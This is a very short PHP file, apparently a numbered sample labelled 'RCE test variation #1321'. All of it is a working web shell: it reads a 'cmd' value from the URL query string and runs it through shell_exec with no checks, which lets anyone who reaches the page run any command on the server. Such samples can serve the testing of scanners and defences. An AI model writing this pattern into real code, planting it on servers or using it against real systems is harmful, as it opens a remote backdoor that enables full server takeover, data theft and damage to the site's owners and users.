<?php
// RCE test variation #1321
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>